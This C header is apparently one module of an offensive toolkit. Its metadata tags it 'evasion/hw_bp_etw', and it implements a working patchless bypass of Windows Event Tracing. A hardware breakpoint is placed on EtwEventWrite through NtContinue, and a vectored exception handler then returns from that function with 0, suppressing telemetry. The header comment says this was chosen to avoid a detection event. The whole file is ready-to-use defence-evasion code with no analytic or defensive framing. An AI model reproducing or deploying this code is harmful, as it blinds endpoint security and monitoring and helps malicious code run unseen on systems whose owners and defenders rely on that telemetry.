// chunk: evasion/hw_bp_etw
// depends: (none)
// provides: hwbp_etw_init, hwbp_etw_cleanup
// headers: windows.h
// risk: medium
// note: Patchless ETW bypass — hardware breakpoint on EtwEventWrite + VEH returns 0. Uses NtContinue to set DR registers (avoids SetThreadContext ETW-TI event).

#ifndef CHUNK_HW_BP_ETW
#define CHUNK_HW_BP_ETW

typedef NTSTATUS (NTAPI *pfnNtContinue_hwbp)(PCONTEXT ctx, BOOLEAN alert);

static PVOID g_hwbp_veh = NULL;
static void *g_etw_addr = NULL;

static LONG CALLBACK hwbp_etw_handler(EXCEPTION_POINTERS *ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if ((void *)ex->ContextRecord->Rip == g_etw_addr) {
            ex->ContextRecord->Rip = *(DWORD64 *)ex->ContextRecord->Rsp;
            ex->ContextRecord->Rsp += 8;
            ex->ContextRecord->Rax = 0;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static volatile int g_hwbp_set = 0;

static int hwbp_etw_init(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    g_etw_addr = (void *)GetProcAddress(ntdll, "EtwEventWrite");
    if (!g_etw_addr) return 0;

    pfnNtContinue_hwbp pNtContinue = (pfnNtContinue_hwbp)
        GetProcAddress(ntdll, "NtContinue");
    if (!pNtContinue) return 0;

    g_hwbp_veh = AddVectoredExceptionHandler(1, hwbp_etw_handler);
    if (!g_hwbp_veh) return 0;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL;
    RtlCaptureContext(&ctx);

    if (g_hwbp_set) return 1;
    g_hwbp_set = 1;

    ctx.Dr0 = (DWORD64)g_etw_addr;
    ctx.Dr7 = (ctx.Dr7 & ~0x000F0003ULL) | 0x00000001ULL;

    pNtContinue(&ctx, FALSE);
    return 1;
}

static void hwbp_etw_cleanup(void) {
    if (g_hwbp_veh) {
        RemoveVectoredExceptionHandler(g_hwbp_veh);
        g_hwbp_veh = NULL;
    }
}

#endif
